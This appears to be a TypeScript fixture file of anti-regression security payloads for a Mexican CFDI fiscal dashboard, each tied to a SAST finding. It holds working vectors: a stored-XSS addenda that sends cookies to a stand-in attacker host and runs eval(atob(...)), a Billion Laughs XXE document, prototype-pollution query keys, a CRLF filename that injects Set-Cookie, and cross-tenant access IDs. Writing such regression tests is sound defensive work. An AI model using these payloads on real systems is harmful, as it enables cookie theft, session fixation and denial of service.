// SAST Dashboard Fiscal · Payloads de prueba anti-regresión (DF-001…DF-010)
// Correspondencia 1:1 con findings report SAST (DASHBOARD-001…DASHBOARD-017).
// NO son payloads de explotación: sólo vectores para validar que los fixes bloquean el path.

import crypto from 'crypto'

// =========================================================
// DF-001 · DASHBOARD-001 (BOLA cross-tenant · 8 drilldowns)
// Usuario ORG_B (uuid ORG_B) intenta consultar companyId ORG_A.
// =========================================================
export const DF001_BOLA_CROSS_TENANT = {
  name: 'DF-001 BOLA drilldown ORG_B → ORG_A',
  severity: 'Critico',
  // IDs de seed-sast-fixtures.mts (ver SAST-SEED-IDS.json):
  sessionUser: { id: 'cmnnu4saj0001sfg3eq10jt5p', systemRole: 'USER' } as const, // Member APPROVED de ORG_B
  targetCompanyId: 'cmnnu4sb70000sfg3tmdq8wqb', // company de ORG_A (NO accesible por user ORG_B)
  expectedBefore: 200,
  expectedAfter: 403
}

// =========================================================
// DF-002 · DASHBOARD-002 (Member.status=REJECTED con JWT vigente)
// =========================================================
export const DF002_MEMBER_REJECTED_STILL_ACCESS = {
  name: 'DF-002 Accesso pós-despedida (status REJECTED)',
  userId: 'cmnnu4saj0002sfg3e3krvwhf', // Se marca REJECTED en el beforeAll del test
  membershipStatus: 'REJECTED' as const,
  targetRoute: '/api/dashboard_fiscal/drilldown/ingresos_nominativos',
  expectedAfter: 404 // "Membresía no encontrada/APPROVED"
}

// =========================================================
// DF-003 · DASHBOARD-003 (ingresos-parciales ?rfc= RFC 3º publico CFE)
// =========================================================
export const DF003_RFC_UNSCOPED_LEAK = {
  name: 'DF-003 Ingresos-parciales con RFC público sin companyId',
  queryParams: {
    startDate: '2020-01-01',
    endDate: '2028-12-31',
    rfc: 'CFEXXXXXXXXXX01' // RFC público Comisión Federal de Electricidad
  },
  expectedAfter: 400 // companyId OBLIGATORIO (NO ?rfc=)
}

// =========================================================
// DF-004 · DASHBOARD-004 (api-logs ?orgId= omitido → leak org aleatoria)
// =========================================================
export const DF004_APILOGS_MISSING_ORGID = {
  name: 'DF-004 API logs sin ?orgId= (pick aleatoria org)',
  multiOrgUser: { id: 'cmnnu4saj0005sfg3cdm19e5q', orgA: 'cmnntrppk000502gcp93ketfx', orgB: 'cmnnu4sa60000sfg3kkxvgav' },
  paramsNoOrg: { page: '1', limit: '10' },
  // Post-fix: si ?orgId= vacío → bind a org más vieja ASC; NUNCA "pick la primera sin ORDER BY".
  expectedAfterDeterministic: true
}

// =========================================================
// DF-005 · DASHBOARD-005 (includeHeavyMetrics default TRUE DoS años 1M)
// =========================================================
export const DF005_HEAVY_DEFAULT_METRICS_DOS = {
  name: 'DF-005 includeHeavyMetrics sin param (antes TRUE)',
  params: { companyId: 'ANY', startDate: '2020-01-01', endDate: '2028-12-31' },
  // Antes: includeHeavyMetrics = !== 'false' → TRUE.
  // Después: includeHeavyMetrics === 'true' → DEFAULT FALSE.
  expectedAfterIncludedFlag: false
}

// =========================================================
// DF-006 · DASHBOARD-007 (1000 meses loop Promise.all DoS)
// =========================================================
export const DF006_MAX_MONTHS_192_QUERIES = {
  name: 'DF-006 Rango 1000 meses (192 aggregates paralelos)',
  rangeMonths: 1200,
  limitHard: 36, // 3 años hard-coded MAX_MONTHS
  expectedAfterStatus: 400
}

// =========================================================
// DF-007 · DASHBOARD-010 (Prototype Pollution workpaper invoices has.__proto__)
// =========================================================
export const DF007_PROTO_POLLUTION_WORKPAPER = {
  name: 'DF-007 Prototype Pollution invoices attr.__proto__.polluted',
  queryEntries: [
    ['companyId', 'X'],
    ['page', '1'],
    ['limit', '10'],
    ['has.__proto__.polluted', 'true'],
    ['has.__proto__.constructor.prototype.admin', 'true'],
    ['attr.Subtotal.gte', '99999999999999']
  ],
  hasKeyAlphanumericOnlyBeforeReject: false,
  expectedAfterObjectProtoClean: true // admin property undefined después del fix
}

// =========================================================
// DF-008 · DASHBOARD-011 (XXE Billion Laughs DOMParser @xmldom)
// =========================================================
export const DF008_XXE_XMLDOM_BILLION_LAUGHS = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0" Folio="&lol4;" Serie="A" Total="100">
  <cfdi:Emisor Rfc="AAA010101AAA" Nombre="ACME SA DE CV"/>
  <cfdi:Receptor Rfc="XEXX010101000"/>
</cfdi:Comprobante>`

// =========================================================
// DF-009 · DASHBOARD-012 (XSS Addenda CDATA stored vía upload XML)
// =========================================================
export const DF009_XSS_STORED_CFDI_ADDENDA = `<?xml version="1.0"?>
<cfdi:Comprobante xmlns:cfdi="http://www.sat.gob.mx/cfd/4" Version="4.0" Folio="1" Serie="A" Total="100">
  <cfdi:Emisor Rfc="AAA010101AAA" Nombre="ACME"/>
  <cfdi:Receptor Rfc="XEXX010101000"/>
  <cfdi:Conceptos>
    <cfdi:Concepto ClaveProdServ="01010101" ClaveUnidad="H87" Cantidad="1" ValorUnitario="100" Importe="100" Descripcion="Servicio"/>
  </cfdi:Conceptos>
  <cfdi:Addenda>
    <![CDATA[
      <img src=x onerror='fetch("https://attacker.test/steal?c="+document.cookie,{credentials:"include"})'/>
      <svg onload="eval(atob('ZG9jdW1lbnQuY29va2llKSA='))"/>
    ]]>
  </cfdi:Addenda>
</cfdi:Comprobante>`

// =========================================================
// DF-010 · DASHBOARD-016 (HTTP Splitting CRLF Content-Disposition filename)
// =========================================================
export const DF010_CRLF_FILENAME_ZIP_DOWNLOAD = {
  name: 'DF-010 Content-Disposition filename CRLF session fixation',
  maliciousFolio: `A\r\nSet-Cookie:hacked_session_token=attacker123;Path=/;Max-Age=31536000;SameSite=None\r\nIgnore:`,
  safeCharsAfter: /^[A-Za-z0-9_-]+$/,
  expectedAfterSafeName: 'A_Set-Cookie_hacked_session_token_attacker123_Path___Max-Age_31536000_SameSite_None_Ignore__'
}

// Helpers misc para construir UUIDs de prueba 1:1 seed fixtures.
export function mkDummyAuditPayload(opts: { leakXmlContent?: boolean, leakPassword?: boolean } = {}) {
  const payload: Record<string, unknown> = {
    issuerRfc: 'AAA010101AAA',
    folio: '1',
    total: 100.0,
    requestId: crypto.randomUUID(),
    ...(opts.leakXmlContent ? { xmlContent: '<?xml version="1.0"?><cfdi:Comprobante> ... FULL XML ' + crypto.randomBytes(256).toString('hex') + ' </cfdi:Comprobante>' } : {}),
    ...(opts.leakPassword ? { passwordPlaintext: 'SuperAdmin123!' } : {}),
  }
  return payload
}
